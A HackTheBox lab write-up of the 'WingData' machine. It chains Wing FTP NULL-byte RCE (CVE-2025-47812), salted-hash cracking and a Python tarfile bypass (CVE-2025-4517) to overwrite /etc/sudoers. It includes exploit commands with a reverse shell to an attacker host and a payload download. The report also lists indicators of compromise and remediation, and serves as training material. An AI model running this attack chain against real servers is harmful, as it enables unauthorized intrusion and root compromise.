---
layout: writeup
title: "WingData"
platform: HTB
os: Linux
date: 2026-03-09
techniques: ["unauthenticated RCE", "NULL byte injection", "hash cracking", "tarfile filter bypass"]
cve: ["CVE-2025-47812", "CVE-2025-4517"]
description: "Wing FTP NULL byte injection RCE, SHA256+salt hash crack for lateral movement, Python tarfile symlink bypass to overwrite sudoers."
---

# WingData - Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-09 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

The "WingData" machine was found to contain a critical chain of vulnerabilities spanning its FTP web service, credential storage, and system configuration. An unauthenticated attacker could exploit CVE-2025-47812, a NULL byte injection vulnerability in Wing FTP Server v7.4.3, to achieve remote code execution as the `wingftp` user. Credentials for the system user `wacky` were recovered from Wing FTP's XML configuration files and cracked using a known salting scheme (`SHA256(password + "WingFTP")`). A misconfigured sudo rule allowing unrestricted execution of a Python backup script, combined with CVE-2025-4517 (Python tarfile symlink/hardlink bypass), allowed arbitrary writes to `/etc/sudoers` and full root compromise. Immediate remediation of the FTP server version, credential storage practices, and sudo configuration is strongly recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"WingData"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → vhost enum (ftp.wingdata.htb) → Wing FTP Server v7.4.3
→ CVE-2025-47812 (NULL byte injection unauthenticated RCE) → shell as wingftp
→ wacky.xml SHA256+WingFTP hash → hashcat crack → su wacky
→ sudo python3 backup script → CVE-2025-4517 (tarfile symlink/hardlink bypass)
→ /etc/sudoers write → sudo /bin/bash → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory & vhost enumeration |
| `python3 CVE-2025-47812` | Unauthenticated RCE via NULL byte injection |
| `nc` | Reverse shell listener |
| `hashcat` | SHA256+salt password cracking |
| `python3 CVE-2025-4517` | Tarfile symlink/hardlink bypass for arbitrary file write |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -Pn -T4 <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian | Standard SSH |
| 80/tcp | HTTP | Apache 2.4.66 | Redirects to wingdata.htb |

**Key Observations:**
- HTTP redirects to virtual host `wingdata.htb` — added to `/etc/hosts`
- Debian Linux identified from service banners
- Small attack surface — all entry through web

### 4.2 Virtual Host Setup

```bash
echo "<target-ip> wingdata.htb" | sudo tee -a /etc/hosts
```

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Commands:**
```bash
gobuster dir -u http://wingdata.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster vhost -u http://wingdata.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

**Findings:**
- `/index.html` — "WingData Solutions" static marketing site
- `/assets/`, `/vendor/` — static resources only
- Vhost scan returned all 301 redirects (false positives) — no valid subdomains found via automated scan
- Manual review of page source revealed a "Client Portal" nav link pointing to `http://ftp.wingdata.htb/`

```bash
echo "<target-ip> ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### 5.2 Wing FTP Server

Navigating to `http://ftp.wingdata.htb/` revealed:
```
FTP server software powered by Wing FTP Server v7.4.3
```

Version **7.4.3** confirmed — below the patched version 7.4.4.

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** CVE-2025-47812 — Unauthenticated RCE via NULL Byte Injection
**CVSS:** 10.0 (Critical)
**Location:** Wing FTP Server ≤ 7.4.3 — login username parameter
**Reasoning:** The `c_CheckUser` function in Wing FTP Server truncates usernames at NULL bytes using `strlen()`, allowing an attacker to authenticate as a valid user (e.g., `anonymous`) by appending a NULL byte followed by arbitrary Lua code. The full unsanitized username — including the injected payload — is written into session `.lua` files that are executed upon session reload. On Linux, Wing FTP runs as root, so injected code executes with full privileges at the FTP service level.

**Prerequisites:** Anonymous login enabled (default in many installations) or any valid credential with no password set.

### 6.2 Exploitation — CVE-2025-47812

```bash
git clone https://github.com/pevinkumar10/CVE-2025-47812
cd CVE-2025-47812
pip3 install -r requirements.txt --break-system-packages

# Start listener
nc -lvnp 4444

# Fire exploit
python3 exploit.py --target http://ftp.wingdata.htb --lhost <attack-ip> --lport 4444
```

**Result:** Reverse shell received as `wingftp`.

```bash
# Stabilise shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 7. Lateral Movement

### 7.1 Credential Discovery in Wing FTP XML Config

Wing FTP Server stores user accounts as XML files under its installation directory. As `wingftp`, these files were readable:

```bash
find /opt/wftpserver -name "*.xml" 2>/dev/null
cat /opt/wftpserver/Data/1/users/wacky.xml
```

**Finding:** SHA256 hash for system user `wacky`:
```
[REDACTED]
```

### 7.2 Hash Format Identification

Reviewing Wing FTP's Lua source revealed the password hashing scheme:

```bash
grep -r "password" /opt/wftpserver/lua/ServerInterface.lua | grep salt
# local temppass = user.password.."WingFTP"
# password_md5 = sha2(temppass)
```

**Format:** `SHA256(password + "WingFTP")` — hashcat mode `1410` (`sha256($pass.$salt)`)

### 7.3 Hash Cracking

```bash
echo "[REDACTED]:WingFTP" > wacky_salted.txt
hashcat -m 1410 wacky_salted.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `[REDACTED]`

### 7.4 Shell as wacky

```bash
su wacky
# password: [REDACTED]
cat /home/wacky/user.txt
```

**User flag obtained:** `[REDACTED]`

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

```bash
sudo -l
```

**Finding:**
```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script extracts tar archives using:
```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

**Constraints checked:**
- Backup files must match `backup_<digits>.tar`
- Restore dir must start with `restore_`
- Source directory `/opt/backup_clients/backups/` — writable by `wacky`

### 8.2 Escalation Vector

**Vulnerability:** CVE-2025-4517 — Python tarfile symlink + hardlink bypass
**Affected versions:** Python 3.8.0 through 3.13.1
**Root cause:** `filter="data"` blocks direct symlink escapes but fails to account for hardlinks that reference files through previously created symlinks. By crafting a tar archive with a deep nested symlink chain escaping the extraction directory, followed by a hardlink pointing through that escaped symlink, arbitrary files outside the extraction root can be overwritten — including `/etc/sudoers`.

```bash
# Host PoC on attack machine
python3 -m http.server 8080

# Download from target
wget http://<attack-ip>:8080/CVE-2025-4517-POC.py

# Run exploit — creates malicious tar, deploys to backups dir, triggers extraction
python3 CVE-2025-4517-POC.py
# Answer 'y' to spawn root shell

# Verify
sudo /bin/bash
whoami  # root
cat /root/root.txt
```

**Result:** `wacky ALL=(ALL) NOPASSWD: ALL` written to `/etc/sudoers` → root shell.

**Root flag obtained:** `[REDACTED]`

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | CVE-2025-47812 — Unauthenticated RCE via NULL byte injection | 🔴 Critical | Wing FTP Server login endpoint |
| 2 | Wing FTP user credentials stored in plaintext-adjacent XML | 🔴 Critical | `/opt/wftpserver/Data/1/users/` |
| 3 | SHA256+static salt ("WingFTP") — weak password hashing | 🟠 High | Wing FTP password storage |
| 4 | sudo python3 backup script with unrestricted arguments | 🔴 Critical | `/etc/sudoers` |
| 5 | CVE-2025-4517 — Python tarfile filter bypass → arbitrary file write | 🔴 Critical | `restore_backup_clients.py` |
| 6 | Password reuse between FTP account and system user | 🟠 High | `wacky` user |
| 7 | FTP vhost link exposed in public page source | 🔵 Low | `http://wingdata.htb` nav |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Malformed login requests to Wing FTP containing NULL bytes in username field
- Unexpected session `.lua` files with non-standard content in `/opt/wftpserver/session/`
- Outbound reverse shell connections from the FTP server process
- `hashcat` execution against extracted hashes (offline, undetectable on target)
- `su wacky` from `wingftp` user in auth logs
- Creation of `backup_9999.tar` in `/opt/backup_clients/backups/`
- `sudo python3 restore_backup_clients.py` invocation in auth logs
- Modification of `/etc/sudoers`

### 10.2 Security Weaknesses

- Wing FTP Server running an unpatched version (7.4.3) with a CVSS 10.0 vulnerability
- FTP service accessible via subdomain linked from public website
- User credentials stored in XML files readable by the service account
- Static salt "WingFTP" applied to all user password hashes — trivially known
- Sudo rule grants unrestricted execution of a Python script processing attacker-controlled input
- Python version vulnerable to CVE-2025-4517 tarfile filter bypass

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Upgrade Wing FTP Server to 7.4.4+ | Finding 1 |
| Immediate | Restrict FTP admin portal — remove public link, IP allowlist | Finding 7 |
| Immediate | Rotate all Wing FTP user credentials | Finding 2 |
| Immediate | Upgrade Python to 3.13.2+ to patch CVE-2025-4517 | Finding 5 |
| Immediate | Remove or heavily restrict sudo backup script rule | Finding 4 |
| Short-term | Implement per-user random salts for FTP password hashing | Finding 3 |
| Short-term | Enforce different passwords for FTP accounts vs system accounts | Finding 6 |
| Short-term | Add tar content validation before extraction (reject symlinks/hardlinks) | Finding 5 |
| Long-term | Run Wing FTP service as a dedicated low-privilege user, not `wingftp` with sudo access | Finding 1 |
| Long-term | Implement file integrity monitoring on `/etc/sudoers` and `/etc/passwd` | Finding 5 |

---

## 11. Lessons Learned

- **Vhost enum isn't always the answer** — the FTP subdomain was found in the page source, not via automated fuzzing. Always read the HTML.
- **Read the Lua source** — Wing FTP's password hashing scheme was documented in its own bundled Lua files. One grep revealed the exact salt format, saving hours of guessing.
- **`filter="data"` is not sufficient** — CVE-2025-4517 shows that Python's tarfile filter doesn't fully protect against symlink+hardlink chaining. Don't trust extraction filters alone; validate tar contents before processing.
- **Check the FTP server version immediately** — Wing FTP 7.4.3 had a CVSS 10.0 unauthenticated RCE. Version disclosure in the web UI gave us the attack vector in seconds.
- **Static salts are almost as bad as no salts** — knowing the salt is "WingFTP" for every user means standard wordlist attacks work perfectly with `-m 1410`.

---

*End of Report*

*Classification: Public (Redacted Version) — sensitive values redacted as this is an active HackTheBox machine*

*Full version with flags and credentials will be published after box retirement*
